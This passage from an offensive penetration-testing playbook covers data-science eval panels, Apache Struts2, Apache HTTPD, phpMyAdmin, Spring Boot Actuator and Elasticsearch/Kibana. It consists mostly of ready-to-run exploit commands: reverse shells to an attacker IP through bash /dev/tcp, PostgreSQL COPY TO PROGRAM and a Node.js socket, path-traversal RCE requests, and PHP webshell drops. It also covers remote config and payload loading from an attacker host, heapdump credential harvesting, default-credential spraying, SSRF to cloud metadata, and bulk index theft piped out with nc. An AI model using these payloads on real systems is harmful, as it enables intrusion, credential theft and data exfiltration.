The same pattern (web-exposed eval panel → OS command execution) applies to other data platforms. Recognize any of these on a port scan and treat as immediate RCE candidates.

#### Jamovi (R-based stats tool — default port 41337)

Jamovi exposes the Rj Editor module which executes arbitrary R code as the jamovi process user.

```bash
# Identify Jamovi
curl -s http://<TARGET>:41337/ | grep -i jamovi
nmap -sV -p 41337 <TARGET>

# RCE via R system() — navigate to Analyses → Rj Editor in browser, paste:
system("id", intern=TRUE)
system("bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1'")
```

#### RStudio Server (default port 8787)

```bash
# Identify RStudio Server
curl -s http://<TARGET>:8787/ | grep -i rstudio
# Default: no default creds — uses PAM (OS accounts)

# After login — Console tab executes R as the authenticated user
system("id")
system("bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1'")

# Terminal tab gives direct shell (no R wrapper needed)
```

#### SQL-Lab / Adminer / pgAdmin Query Console → COPY TO PROGRAM

When a database web console is exposed and you have DBA access, the SQL primitive IS the RCE.

```bash
# PostgreSQL superuser — COPY TO PROGRAM (covered in enumeration-methodology.md)
# From any SQL web console (pgAdmin, Adminer, phpPgAdmin, SQL-lab):
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1"';
```

#### Generic Recognition Methodology

```bash
# Port-scan recognition for eval-panel apps:
# 8888/8889 → Jupyter    | 41337 → Jamovi    | 8787 → RStudio
# 1880 → Node-RED        | 8080 → Jenkins Groovy | 5050 → pgAdmin
# 8088 → Apache Zeppelin | 3838/8001 → Shiny Server
# ANY web app with a "Console", "Terminal", "Scripting", "Query" tab = eval panel candidate

# Quick confirm: does it execute user-supplied code server-side?
# If yes → OS command execution is one function call away (system/exec/spawn/COPY TO PROGRAM)
```

#### Living-off-the-land / LOTL variant

```bash
# All of the above use the application's own built-in scripting interface as the RCE vector.
# No external tools needed — the "exploit" is typing a command into the app's eval box.
# From a reverse shell already on the box, identify running eval-panel services:
ss -tlnp | grep -E ':(8888|8787|41337|1880|8080|5050|8088)\b'
ps aux | grep -iE 'jupyter|rstudio|jamovi|node-red|pgadmin|zeppelin'
```

---

## Phase 14d: Apache Struts2

### Enumeration

```bash
# Identify Struts2 — .action / .do extensions, struts2-showcase artifacts
curl -s -I http://<TARGET>:8080/ | grep -i 'X-Powered-By\|Server'
curl -s http://<TARGET>:8080/struts2-showcase/                          # default sample app
curl -s http://<TARGET>:8080/struts2-showcase/showcase.action
curl -s http://<TARGET>:8080/struts2-rest-showcase/orders.xhtml
curl -sI http://<TARGET>:8080/index.action
curl -sI http://<TARGET>:8080/login.action

# Version fingerprint via known endpoints / 404 footer
curl -s http://<TARGET>:8080/nonexistent.action | grep -iE 'struts|version'

# nuclei tags
nuclei -t cves/ -tags struts -u http://<TARGET>:8080
nuclei -tags struts2 -u http://<TARGET>:8080

# nmap NSE
nmap -p 8080 --script http-vuln-cve2017-5638 <TARGET>
```

### CVE-2017-5638 — Content-Type OGNL (Equation Editor)

Struts2 2.3.5–2.3.31, 2.5–2.5.10 — Jakarta Multipart parser parses `Content-Type` header through OGNL.

```bash
# msf
msf6 > use exploit/multi/http/struts2_content_type_ognl
msf6 > set RHOSTS <TARGET>
msf6 > set TARGETURI /struts2-showcase/index.action
msf6 > run

# nuclei template
nuclei -t cves/2017/CVE-2017-5638.yaml -u http://<TARGET>:8080

# searchsploit
searchsploit struts 2017-5638
searchsploit -m java/webapps/41570.py
python3 41570.py http://<TARGET>:8080/struts2-showcase/index.action "id"
```

### CVE-2017-9805 — REST Plugin XStream Deserialization

Struts2 2.1.2–2.3.33, 2.5–2.5.12 — REST plugin deserializes XStream payload over XML.

```bash
# msf
msf6 > use exploit/multi/http/struts2_rest_xstream
msf6 > set RHOSTS <TARGET>
msf6 > set TARGETURI /struts2-rest-showcase/orders/3
msf6 > run

# nuclei
nuclei -t cves/2017/CVE-2017-9805.yaml -u http://<TARGET>:8080

# searchsploit
searchsploit struts 2017-9805
searchsploit -m xml/webapps/42627.py
python3 42627.py http://<TARGET>:8080/struts2-rest-showcase/orders/3 "id"
```

### CVE-2018-11776 — Namespace OGNL

Struts2 2.3–2.3.34, 2.5–2.5.16 — namespace evaluated as OGNL when `alwaysSelectFullNamespace=true` and no `namespace` defined.

```bash
# msf
msf6 > use exploit/multi/http/struts2_namespace_ognl

# nuclei
nuclei -t cves/2018/CVE-2018-11776.yaml -u http://<TARGET>:8080

# searchsploit
searchsploit struts 2018-11776
searchsploit -m java/webapps/45260.py
python3 45260.py --url http://<TARGET>:8080/ --cmd "id"
```

### CVE-2023-50164 — File Upload Path Traversal → RCE

Struts2 2.0.0–2.5.32, 6.0.0–6.3.0 — case-insensitive filename param manipulation lets attacker overwrite files outside upload dir.

```bash
# nuclei
nuclei -t cves/2023/CVE-2023-50164.yaml -u http://<TARGET>:8080

# searchsploit
searchsploit struts 2023-50164

# Public PoC concept (multipart upload with case-confused param):
# - Send normal "upload" + crafted "Upload" field whose filename is ../../webapps/ROOT/shell.jsp
# - msf module: exploit/multi/http/struts2_multi_eval_ognl
msf6 > use exploit/multi/http/struts2_multi_eval_ognl
```

### CVE-2020-17530 / CVE-2021-31805 — Double OGNL (S2-061 / S2-062)

```bash
# Forced double OGNL evaluation via tag attributes (skill, id, etc.)
nuclei -t cves/2020/CVE-2020-17530.yaml -u http://<TARGET>:8080
nuclei -t cves/2021/CVE-2021-31805.yaml -u http://<TARGET>:8080
searchsploit struts 2020-17530
searchsploit struts 2021-31805
```

### Common CVEs

| CVE | S2 Bulletin | Affected | Notes |
|-----|-------------|----------|-------|
| CVE-2017-5638 | S2-045/046 | 2.3.5–2.3.31, 2.5–2.5.10 | Content-Type OGNL — Equifax breach |
| CVE-2017-9805 | S2-052 | 2.1.2–2.3.33, 2.5–2.5.12 | REST plugin XStream RCE |
| CVE-2018-11776 | S2-057 | 2.3–2.3.34, 2.5–2.5.16 | Namespace OGNL |
| CVE-2019-0230 | S2-059 | 2.0.0–2.5.20 | Forced double OGNL |
| CVE-2020-17530 | S2-061 | 2.0.0–2.5.25 | Forced OGNL via tag attrs |
| CVE-2021-31805 | S2-062 | 2.0.0–2.5.29 | S2-061 patch bypass |
| CVE-2023-50164 | S2-066 | 2.0.0–2.5.32, 6.0.0–6.3.0 | File upload path traversal RCE |

### Post-Exploit

```bash
# Struts apps run inside Tomcat/Jetty/JBoss → see those phases for filesystem map
# Look for application config + DB creds:
find / -path '*WEB-INF/classes/*.properties' 2>/dev/null
find / -name 'struts.xml' -o -name 'struts.properties' 2>/dev/null
cat /opt/tomcat/webapps/<APP>/WEB-INF/classes/application.properties 2>/dev/null
```

---

## Phase 14e: Apache HTTPD (Modern CVEs)

### Enumeration

```bash
# Banner + module list
curl -sI http://<TARGET>/ | grep -i server                              # Apache/2.4.49
curl -s http://<TARGET>/server-status                                   # mod_status (often whitelisted to localhost)
curl -s http://<TARGET>/server-info                                     # mod_info
curl -s -H "Host: balancer-manager" http://<TARGET>/balancer-manager    # mod_proxy_balancer

# Module fingerprint
nmap -p 80,443 --script http-apache-server-status,http-server-header <TARGET>
nmap -p 80,443 --script http-vuln-cve2021-41773 <TARGET>

# nuclei
nuclei -tags apache -u http://<TARGET>
```

### CVE-2021-41773 / CVE-2021-42013 — Path Traversal + RCE

Apache 2.4.49 (CVE-2021-41773) and 2.4.50 patch bypass (CVE-2021-42013). Requires `Require all granted` on traversed dir.

```bash
# File read (LFI) — works when path-mapped dir is missing access controls
curl --path-as-is "http://<TARGET>/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd"
curl --path-as-is "http://<TARGET>/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"

# CVE-2021-42013 — patch bypass with double-encoded dot
curl --path-as-is "http://<TARGET>/icons/.%%32e/.%%32e/.%%32e/.%%32e/etc/passwd"
curl --path-as-is "http://<TARGET>/cgi-bin/.%%32e/.%%32e/.%%32e/.%%32e/bin/sh" --data 'echo Content-Type: text/plain; echo; id'

# RCE via cgi-bin (mod_cgi enabled + writable cgi-bin script path)
curl -v --path-as-is --data 'echo;id' \
  "http://<TARGET>/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
curl -v --path-as-is --data 'echo;bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' \
  "http://<TARGET>/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/bash"

# nuclei + msf
nuclei -t cves/2021/CVE-2021-41773.yaml -u http://<TARGET>
nuclei -t cves/2021/CVE-2021-42013.yaml -u http://<TARGET>
msf6 > use exploit/multi/http/apache_normalize_path_rce
```

### mod_proxy / mod_rewrite SSRF + Open Proxy (CVE-2021-40438, CVE-2024-38476/38477/38474)

```bash
# CVE-2021-40438 — mod_proxy SSRF via crafted uri-path
curl "http://<TARGET>/foo?unix:AAAAAAAAAAAAAA|http://internal.host/admin"

# CVE-2024-38474/38476/38477 — mod_rewrite/proxy backreference auth bypass + SSRF + RCE
nuclei -t cves/2024/CVE-2024-38476.yaml -u http://<TARGET>
nuclei -t cves/2024/CVE-2024-38477.yaml -u http://<TARGET>
nuclei -t cves/2024/CVE-2024-38474.yaml -u http://<TARGET>

# Open balancer-manager (mod_proxy_balancer) — manipulate worker routes
curl http://<TARGET>/balancer-manager
curl -X POST "http://<TARGET>/balancer-manager?b=mybalancer&w=http://victim&nonce=<N>" \
  -d "w_status_D=1"           # disable worker — pivot/DoS demo only
```

### mod_status / mod_info Information Leak

```bash
# /server-status — active requests, client IPs, internal hostnames, Referer
curl -s http://<TARGET>/server-status?refresh=1 | grep -E 'GET|POST|^[0-9]+-'
curl -sH "X-Forwarded-For: 127.0.0.1" http://<TARGET>/server-status

# /server-info — full module + config dump
curl -s http://<TARGET>/server-info | head -100
```

### Common CVEs

| CVE | Affected | Notes |
|-----|----------|-------|
| CVE-2021-41773 | 2.4.49 | Path traversal + RCE (cgi-bin) |
| CVE-2021-42013 | 2.4.49, 2.4.50 | CVE-2021-41773 patch bypass |
| CVE-2021-40438 | < 2.4.49 | mod_proxy SSRF |
| CVE-2022-31813 | < 2.4.54 | mod_proxy X-Forwarded-* drop bypass |
| CVE-2023-25690 | 2.4.0–2.4.55 | mod_proxy HTTP smuggling |
| CVE-2024-38474 | 2.4.0–2.4.59 | mod_rewrite backreference RCE |
| CVE-2024-38476 | 2.4.0–2.4.59 | Backend auth bypass via crafted URI |
| CVE-2024-38477 | 2.4.0–2.4.59 | mod_proxy null deref / SSRF |

### Post-Exploit

```bash
# Apache typically runs as www-data / apache / httpd
id
ls -la /etc/apache2/ /etc/httpd/ 2>/dev/null
cat /etc/apache2/sites-enabled/*.conf /etc/httpd/conf.d/*.conf 2>/dev/null
cat /etc/apache2/.htpasswd 2>/dev/null                                  # auth files
find / -name '.htpasswd' 2>/dev/null
# CGI scripts often run as same user — webshell drop:
ls -la /usr/lib/cgi-bin/ /var/www/cgi-bin/ 2>/dev/null
```

---

## Phase 14f: phpMyAdmin

### Enumeration

```bash
# Common paths
for p in /phpmyadmin /pma /myadmin /PMA /mysql /sqlweb /admin/phpmyadmin /db; do
  echo "[$p]"; curl -sI "http://<TARGET>${p}/" | head -1
done

# Direct fingerprint
curl -s http://<TARGET>/phpmyadmin/index.php | grep -oP 'phpMyAdmin \d+\.\d+\.\d+'
curl -s http://<TARGET>/phpmyadmin/README | head -5
curl -s http://<TARGET>/phpmyadmin/Documentation.html | grep version
curl -s http://<TARGET>/phpmyadmin/ChangeLog | head -5

# nuclei
nuclei -tags phpmyadmin -u http://<TARGET>
```

### Default Credentials

```text
root:                 (empty — common on XAMPP/WAMP/lab installs, allow-no-password)
root:root
root:toor
root:password
admin:admin
pma:pmapass
phpmyadmin:phpmyadmin
mysql:mysql
```

```bash
# Spray
hydra -L users.txt -P pass.txt <TARGET> http-post-form \
  "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=1:Cannot log in"

# Manual login probe
curl -sc cookies.txt -b cookies.txt -X POST http://<TARGET>/phpmyadmin/index.php \
  -d "pma_username=root&pma_password=&server=1" | grep -i 'cannot log in'
```

### CVE-2018-12613 — File Inclusion / RCE

phpMyAdmin 4.8.0–4.8.1 — `index.php?target=` allows LFI via whitelist bypass; combined with session-poisoning → RCE.

```bash
# Step 1: authenticate (creds required; default creds first)
# Step 2: LFI probe
curl -b cookies.txt "http://<TARGET>/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../etc/passwd"

# Step 3: session-poisoning RCE — inject PHP via SQL query, include session file
# 3a. Poison: run a SQL query containing PHP
#     SELECT '<?php system($_GET["c"]); ?>'
# 3b. Include the session file (PHP serializes it to /var/lib/php/sessions/sess_<PHPSESSID>)
PHPSESSID=$(grep phpMyAdmin cookies.txt | awk '{print $7}')
curl -b cookies.txt "http://<TARGET>/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../var/lib/php/sessions/sess_${PHPSESSID}&c=id"

# searchsploit
searchsploit phpmyadmin 2018-12613
searchsploit -m php/webapps/44924.txt
searchsploit -m php/webapps/50457.py
python3 50457.py -u http://<TARGET>/phpmyadmin/ -l root -p '' -c 'id'
```

### Auth RCE — `SELECT ... INTO OUTFILE` (Webshell Drop)

Requires: MySQL `FILE` privilege + `secure_file_priv` empty/permissive + write access to webroot.

```sql
-- 1. Discover docroot + datadir
SELECT @@datadir;
SELECT @@secure_file_priv;
SELECT @@hostname, @@version, USER(), CURRENT_USER();
SHOW VARIABLES LIKE 'secure_file_priv';

-- 2. Confirm FILE privilege
SHOW GRANTS FOR CURRENT_USER();

-- 3. Find docroot (try common paths)
-- /var/www/html , /var/www , /usr/share/nginx/html , C:\xampp\htdocs , C:\inetpub\wwwroot

-- 4. Drop webshell
SELECT '<?php system($_GET["c"]); ?>'
INTO OUTFILE '/var/www/html/shell.php';

-- Windows variant
SELECT '<?php system($_GET["c"]); ?>'
INTO OUTFILE 'C:/xampp/htdocs/shell.php';

-- 5. Bypass duplicate-output protection by reading first
SELECT '<?php system($_GET["c"]); ?>' INTO DUMPFILE '/tmp/s.php';
SELECT LOAD_FILE('/tmp/s.php') INTO OUTFILE '/var/www/html/shell.php';
```

```bash
# Trigger
curl "http://<TARGET>/shell.php?c=id"
curl "http://<TARGET>/shell.php?c=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/<ATTACKER_IP>/4444%200%3E%261%27"
```

### Auth RCE — UDF (User-Defined Function) on MySQL

```sql
-- When MySQL has FILE priv but webroot is not writable
-- Drop a malicious .so / .dll into MySQL plugin_dir, register UDF, exec
SELECT @@plugin_dir;
-- Use sqlmap --os-shell or raptor_udf2.c (Linux) / lib_mysqludf_sys.dll (Windows)
```

```bash
# sqlmap — automated UDF + INTO OUTFILE chain
sqlmap -u "http://<TARGET>/phpmyadmin/index.php" --cookie="phpMyAdmin=<SESSION>" \
  --os-shell --random-agent
sqlmap --direct "mysql://root:''@<TARGET>:3306/mysql" --os-shell
```

### Common CVEs

| CVE | Affected | Notes |
|-----|----------|-------|
| CVE-2018-12613 | 4.8.0–4.8.1 | LFI → RCE via session poisoning |
| CVE-2016-5734 | < 4.0.10.16 / 4.4.15.7 / 4.6.3 | Auth RCE via preg_replace `/e` |
| CVE-2020-26935 | < 4.9.6 / 5.0.3 | XSS via SearchController |
| CVE-2022-23808 | < 4.9.10 / 5.1.2 | XSS via setup transformation |

### Post-Exploit

```bash
# phpMyAdmin config exposes MySQL creds
cat /etc/phpmyadmin/config.inc.php 2>/dev/null
cat /etc/phpmyadmin/config-db.php 2>/dev/null
cat /var/www/html/phpmyadmin/config.inc.php 2>/dev/null
grep -E "controluser|controlpass|host|user|password" /etc/phpmyadmin/*.php

# MySQL hashes for cracking
mysql -u root -p<PASSWORD> -e "SELECT user, host, authentication_string FROM mysql.user;"
# hashcat -m 300  (mysql >=4.1, *HASH format)
# hashcat -m 11500 / -m 200  for older formats
```

---

## Phase 14g: Spring Boot Actuator

### Enumeration

```bash
# Default: Actuator on app port (8080) under /actuator (Spring Boot 2.x) or root (1.x)
# Spring Boot 1.x exposes endpoints at root: /env, /trace, /heapdump, /mappings
# Spring Boot 2.x+ under /actuator/* (most disabled by default; /health, /info enabled)

# Discovery
curl -s http://<TARGET>:8080/actuator | jq
curl -s http://<TARGET>:8080/actuator/ | jq
curl -s http://<TARGET>:8080/actuator/mappings | jq                     # all routes
curl -s http://<TARGET>:8080/actuator/env | jq                          # env vars + config props
curl -s http://<TARGET>:8080/actuator/configprops | jq                  # @ConfigurationProperties beans
curl -s http://<TARGET>:8080/actuator/loggers | jq
curl -s http://<TARGET>:8080/actuator/beans | jq
curl -s http://<TARGET>:8080/actuator/threaddump | jq
curl -s http://<TARGET>:8080/actuator/scheduledtasks | jq
curl -s http://<TARGET>:8080/actuator/info | jq
curl -s http://<TARGET>:8080/actuator/health | jq                       # often leaks db/redis/disk paths
curl -s http://<TARGET>:8080/actuator/metrics | jq
curl -s http://<TARGET>:8080/actuator/auditevents
curl -s http://<TARGET>:8080/actuator/httptrace                         # last 100 req/resp
curl -s http://<TARGET>:8080/actuator/sessions
curl -s http://<TARGET>:8080/actuator/caches

# Spring Boot 1.x paths (try at root)
for p in env trace dump heapdump mappings info health beans configprops autoconfig metrics; do
  echo "[$p]"; curl -sI http://<TARGET>:8080/$p | head -1
done

# nuclei
nuclei -tags springboot,actuator -u http://<TARGET>:8080
nuclei -t exposures/configs/springboot-* -u http://<TARGET>:8080
```

### Heapdump Credential Extraction

```bash
# Download heap (often hundreds of MB)
curl -sk -o heapdump.hprof http://<TARGET>:8080/actuator/heapdump
file heapdump.hprof
ls -lh heapdump.hprof

# Quick string extraction
strings heapdump.hprof | grep -iE 'password|secret|token|api[_-]?key|aws[_-]?access' | sort -u | head -50
strings heapdump.hprof | grep -iE 'jdbc:|mongodb://|redis://|amqp://' | sort -u
strings heapdump.hprof | grep -E 'AKIA[0-9A-Z]{16}'                     # AWS access keys
strings heapdump.hprof | grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'

# Structured analysis
# Eclipse MAT (Memory Analyzer Tool) — open .hprof, run OQL:
#   SELECT * FROM java.lang.String s WHERE toString(s) LIKE ".*password.*"
# JDumpSpider (purpose-built for actuator heapdumps)
git clone https://github.com/whwlsfb/JDumpSpider
java -jar JDumpSpider.jar heapdump.hprof
```

### env POST → RCE Chains (Spring Boot 1.x + 2.x with write-enabled env)

```bash
# Spring Boot 1.x — POST to /env writes property
# Spring Boot 2.x — POST to /actuator/env (requires management.endpoint.env.post.enabled=true)

# Chain 1: H2 database SQL — RCE via CREATE ALIAS
# 1. Set spring.datasource.url to H2 with ;INIT=...
curl -X POST http://<TARGET>:8080/actuator/env \
  -H 'Content-Type: application/json' \
  -d '{"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS pwn AS $$void e(String s) throws Exception { Runtime.getRuntime().exec(s); }$$;CALL pwn(\"id\");"}'
curl -X POST http://<TARGET>:8080/actuator/refresh                      # trigger re-read

# Chain 2: Eureka XStream deserialization
curl -X POST http://<TARGET>:8080/actuator/env \
  -H 'Content-Type: application/json' \
  -d '{"name":"eureka.client.serviceUrl.defaultZone","value":"http://<ATTACKER_IP>:8888/example"}'
curl -X POST http://<TARGET>:8080/actuator/refresh
# Host malicious XStream XML at http://<ATTACKER_IP>:8888/example — see msf module:
msf6 > use exploit/linux/http/spring_cloud_eureka_xstream_rce

# Chain 3: spring.cloud.bootstrap.location — load malicious YAML/properties
curl -X POST http://<TARGET>:8080/actuator/env \
  -H 'Content-Type: application/json' \
  -d '{"name":"spring.cloud.bootstrap.location","value":"http://<ATTACKER_IP>:8888/evil.yml"}'
curl -X POST http://<TARGET>:8080/actuator/refresh

# Chain 4: logging.config — load malicious logback.xml with JNDI
curl -X POST http://<TARGET>:8080/actuator/env \
  -H 'Content-Type: application/json' \
  -d '{"name":"logging.config","value":"http://<ATTACKER_IP>:8888/logback.xml"}'
curl -X POST http://<TARGET>:8080/actuator/refresh
# logback.xml uses <insertFromJNDI> — pulls ldap://<ATTACKER_IP>/Exploit
```

### Jolokia (Spring Boot integration) — JMX over HTTP

```bash
# Jolokia exposes JMX via HTTP — often at /jolokia or /actuator/jolokia
curl -s http://<TARGET>:8080/jolokia/list                               # MBeans
curl -s http://<TARGET>:8080/actuator/jolokia/list

# CVE-2018-1000130 — Jolokia LDAP JNDI RCE via createJNDIRealm MBean
curl -X POST http://<TARGET>:8080/jolokia \
  -H 'Content-Type: application/json' \
  -d '{"type":"exec","mbean":"Catalina:type=MBeanFactory","operation":"createJNDIRealm","arguments":["Catalina:type=Engine"]}'

# nuclei
nuclei -t exposures/apis/jolokia.yaml -u http://<TARGET>:8080
nuclei -tags jolokia -u http://<TARGET>:8080
```

### CVE-2022-22947 — Spring Cloud Gateway Code Injection

```bash
# Add malicious route via Actuator gateway endpoints, then refresh
curl -X POST http://<TARGET>:8080/actuator/gateway/routes/pwnroute \
  -H 'Content-Type: application/json' \
  -d '{
    "id":"pwnroute",
    "filters":[{
      "name":"AddResponseHeader",
      "args":{"name":"X-Pwn","value":"#{T(java.lang.Runtime).getRuntime().exec(\"id\")}"}
    }],
    "uri":"http://example.com"
  }'
curl -X POST http://<TARGET>:8080/actuator/gateway/refresh
curl http://<TARGET>:8080/actuator/gateway/routes/pwnroute              # triggers SpEL eval

# nuclei
nuclei -t cves/2022/CVE-2022-22947.yaml -u http://<TARGET>:8080
# msf
msf6 > use exploit/multi/http/spring_cloud_gateway_rce
```

### CVE-2022-22965 — Spring4Shell

Spring Framework 5.3.0–5.3.17, 5.2.0–5.2.19 on JDK ≥ 9 + Tomcat WAR deployment + DataBinder.

```bash
# nuclei
nuclei -t cves/2022/CVE-2022-22965.yaml -u http://<TARGET>:8080
nuclei -tags spring4shell -u http://<TARGET>:8080

# msf
msf6 > use exploit/multi/http/spring_framework_rce_spring4shell

# searchsploit
searchsploit spring4shell
searchsploit -m java/webapps/50979.py
python3 50979.py --url http://<TARGET>:8080/path
# PoC structure: POST class.module.classLoader.resources.context.parent.pipeline.first.* params
# to write a JSP webshell into Tomcat webroot
```

### Common CVEs

| CVE | Affected | Notes |
|-----|----------|-------|
| CVE-2022-22965 | Spring 5.3.0–5.3.17, 5.2.0–5.2.19 | Spring4Shell — DataBinder RCE |
| CVE-2022-22963 | Spring Cloud Function < 3.1.7 / 3.2.3 | SpEL RCE via Header |
| CVE-2022-22947 | Spring Cloud Gateway < 3.1.1 / 3.0.7 | Actuator route SpEL RCE |
| CVE-2018-1000130 | Jolokia < 1.5.0 | JNDI LDAP RCE |
| CVE-2021-22053 | Spring Cloud Netflix Hystrix | SSTI RCE |

### Post-Exploit

```bash
# Spring Boot apps run as a service user (often `springboot`, `app`, `tomcat`, or jar runner)
ps -ef | grep -i 'java.*\.jar\|spring'
ls -la /opt/ /srv/ /home/                                               # common deploy dirs
find / -name 'application*.yml' -o -name 'application*.properties' 2>/dev/null
find / -name 'bootstrap*.yml' 2>/dev/null
cat /opt/<APP>/application.yml | grep -iE 'password|secret|jdbc|api'

# Extract creds from running JVM via /proc
ls /proc/*/cmdline | xargs -I{} sh -c 'echo "===  {} ==="; cat {} | tr "\0" " "; echo'
cat /proc/<PID>/environ | tr '\0' '\n' | grep -iE 'pass|secret|token'
```

---

## Phase 14h: Elasticsearch & Kibana

### Enumeration — Elasticsearch

```bash
# Default ports: 9200 (HTTP REST), 9300 (transport)
curl -s http://<TARGET>:9200/                                           # banner — version, cluster_name
curl -s http://<TARGET>:9200/_cluster/health?pretty
curl -s http://<TARGET>:9200/_cluster/state?pretty | head -50
curl -s http://<TARGET>:9200/_cat/indices?v                             # indices + doc counts
curl -s http://<TARGET>:9200/_cat/nodes?v
curl -s http://<TARGET>:9200/_cat/plugins?v
curl -s 'http://<TARGET>:9200/_search?pretty&size=10'                   # full text dump
curl -s 'http://<TARGET>:9200/_all/_search?pretty&size=10'
curl -s 'http://<TARGET>:9200/_nodes?pretty' | head -50

# Per-index dump
curl -s "http://<TARGET>:9200/<INDEX>/_search?pretty&size=1000" > index_dump.json
curl -s "http://<TARGET>:9200/<INDEX>/_search?q=password&pretty&size=100"

# Auth probe (X-Pack)
curl -su elastic:changeme http://<TARGET>:9200/_security/user
curl -su elastic:elastic http://<TARGET>:9200/

# nmap
nmap -p 9200 --script http-elasticsearch-* <TARGET>
```

### Default / Common Credentials

```text
elastic:changeme            (X-Pack default, pre-7.0)
elastic:elastic
kibana:changeme
kibana_system:changeme
admin:admin
logstash_system:changeme
beats_system:changeme
```

### Unauth Data Theft (No X-Pack / Public ES)

```bash
# Bulk dump every index
for idx in $(curl -s http://<TARGET>:9200/_cat/indices?h=index); do
  echo "[+] Dumping $idx"
  curl -s "http://<TARGET>:9200/${idx}/_search?size=10000&scroll=1m&pretty" > "${idx}.json"
done

# elasticdump
npm install -g elasticdump
elasticdump --input=http://<TARGET>:9200/<INDEX> --output=<INDEX>.json --type=data

# Search for sensitive fields
curl -s "http://<TARGET>:9200/_search?q=password+OR+secret+OR+token&size=100&pretty"
```

### CVE-2014-3120 — Groovy Dynamic Scripting RCE

Elasticsearch < 1.2 — dynamic scripting enabled by default.

```bash
# msf
msf6 > use exploit/multi/elasticsearch/script_mvel_rce

# Manual
curl -X POST "http://<TARGET>:9200/_search?pretty" -d '{
  "size": 1,
  "script_fields": {
    "exec": {
      "lang": "groovy",
      "script": "java.lang.Runtime.getRuntime().exec(\"id\").getText()"
    }
  }
}'
```

### CVE-2015-1427 — Groovy Sandbox Bypass

Elasticsearch 1.3.0–1.3.7, 1.4.0–1.4.2 — sandbox bypass.

```bash
# msf
msf6 > use exploit/multi/elasticsearch/search_groovy_script

# Manual PoC
curl -X POST "http://<TARGET>:9200/_search?pretty" -d '{
  "size":1,
  "script_fields": {
    "rce": {
      "lang":"groovy",
      "script":"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").text"
    }
  }
}'
```

### Painless / Mustache Script RCE (Newer ES)

```bash
# Painless (default in 5.x+) — usually sandboxed; check for misconfig
curl -X POST "http://<TARGET>:9200/_search" -H 'Content-Type: application/json' -d '{
  "script_fields": {
    "test": {
      "script": {
        "lang": "painless",
        "source": "Math.PI"
      }
    }
  }
}'

# Snapshot abuse — write-anywhere via configured fs repository
# 1. Register repo pointing at attacker-writable path
curl -X PUT "http://<TARGET>:9200/_snapshot/pwn" \
  -H 'Content-Type: application/json' \
  -d '{"type":"fs","settings":{"location":"/tmp/pwn"}}'
# 2. Create snapshot — files appear at /tmp/pwn (use to drop webshell if path is webroot)
curl -X PUT "http://<TARGET>:9200/_snapshot/pwn/snap1?wait_for_completion=true" \
  -H 'Content-Type: application/json' -d '{"indices":"<INDEX>"}'
```

### Enumeration — Kibana

```bash
# Default: 5601 (often behind reverse proxy)
curl -s http://<TARGET>:5601/                                           # banner
curl -s http://<TARGET>:5601/api/status | jq                            # version + plugins
curl -s http://<TARGET>:5601/api/saved_objects/_find?type=dashboard
curl -s http://<TARGET>:5601/api/saved_objects/_find?type=index-pattern
curl -s http://<TARGET>:5601/app/kibana

# Plugin-specific paths
curl -s http://<TARGET>:5601/api/console/proxy?path=_cat/indices&method=GET    # console proxy
curl -s http://<TARGET>:5601/api/timelion/run

# nuclei
nuclei -tags kibana -u http://<TARGET>:5601
```

### CVE-2018-17246 — Kibana LFI / RCE (Timelion)

Kibana < 6.4.3 / 5.6.13 — local file inclusion via Timelion plugin → RCE through Node.js prototype pollution.

```bash
# searchsploit
searchsploit kibana 2018-17246
searchsploit -m linux/webapps/46322.sh

# Manual probe — LFI confirms vuln
curl -s "http://<TARGET>:5601/api/timelion/run" \
  -H 'Content-Type: application/json' -H 'kbn-xsrf: kibana' \
  -d '{"sheet":["(function(){throw new Error(require(\"child_process\").execSync(\"id\").toString())})()"],"time":{"from":"now-1m","to":"now","interval":"auto","timezone":"UTC"}}'

# Reverse shell payload — host rev.js then chain LFI to require it
# rev.js: (function(){var net=require(\"net\");var c=net.connect({host:\"<ATTACKER_IP>\",port:4444});var s=require(\"child_process\").spawn(\"/bin/sh\",[]);s.stdout.pipe(c);s.stderr.pipe(c);c.pipe(s.stdin);})()
```

### CVE-2019-7609 — Kibana Timelion RCE (later)

Kibana < 5.6.15 / 6.6.1 — prototype pollution + canvas chain → RCE.

```bash
nuclei -t cves/2019/CVE-2019-7609.yaml -u http://<TARGET>:5601
searchsploit kibana 2019-7609
```

### Kibana 6.6.0 SSRF — Console Proxy

```bash
# /api/console/proxy lets authenticated user pivot to any internal host (kibana service account)
curl -s "http://<TARGET>:5601/api/console/proxy?path=&method=GET" \
  -H 'kbn-xsrf: kibana' \
  -H 'Cookie: <SID>'

# Pivot to internal services via path manipulation
curl -s "http://<TARGET>:5601/api/console/proxy?method=GET&path=http://169.254.169.254/latest/meta-data/" \
  -H 'kbn-xsrf: kibana'
```

### Snapshot Repository Abuse — Index Theft

```bash
# Steal full cluster data without exposing /_search bandwidth
# 1. Find attacker-network-reachable repo type — fs/url/s3
curl -s http://<TARGET>:9200/_snapshot/_all
# 2. Register URL repo pointing at attacker (whitelisted in elasticsearch.yml: repositories.url.allowed_urls)
#    — usually fails on hardened installs; fs is more common
curl -X PUT "http://<TARGET>:9200/_snapshot/exfil" \
  -H 'Content-Type: application/json' \
  -d '{"type":"fs","settings":{"location":"/var/lib/elasticsearch/exfil","compress":true}}'
# 3. Snapshot all
curl -X PUT "http://<TARGET>:9200/_snapshot/exfil/all?wait_for_completion=true" \
  -H 'Content-Type: application/json' \
  -d '{"indices":"*","include_global_state":true}'
# 4. Tar+ship from filesystem (post-shell)
tar czf - /var/lib/elasticsearch/exfil | nc <ATTACKER_IP> 4444
```
